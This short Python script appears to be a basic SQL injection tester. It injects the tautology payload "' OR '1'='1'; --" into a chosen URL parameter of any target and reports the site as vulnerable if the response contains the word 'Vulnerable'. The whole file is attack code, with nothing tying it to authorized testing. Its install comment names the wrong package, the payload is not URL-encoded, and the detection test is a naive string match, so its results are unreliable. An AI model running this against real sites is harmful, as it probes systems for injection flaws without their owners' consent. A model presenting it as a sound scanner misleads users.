#pip install python-requests
import requests

def test_sql_injection(url, vulnerable_parameter):
    # Payload for SQL injection
    payload = "' OR '1'='1'; --"

    # Create the complete URL with the payload
    target_url = f"{url}?{vulnerable_parameter}={payload}"

    try:
        # Send a GET request with the payload
        response = requests.get(target_url)

        # Check if the response indicates a successful injection (e.g., look for specific content)
        if "Vulnerable" in response.text:
            print(f"The URL is vulnerable to SQL injection: {target_url}")
        else:
            print(f"The URL is not vulnerable to SQL injection: {target_url}")

    except requests.RequestException as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    # Replace 'your_target_url' and 'your_vulnerable_parameter' with the actual target URL and vulnerable parameter
    target_url = 'your_target_url'
    vulnerable_parameter = 'your_vulnerable_parameter'

    # Test the target URL for SQL injection vulnerability
    test_sql_injection(target_url, vulnerable_parameter)
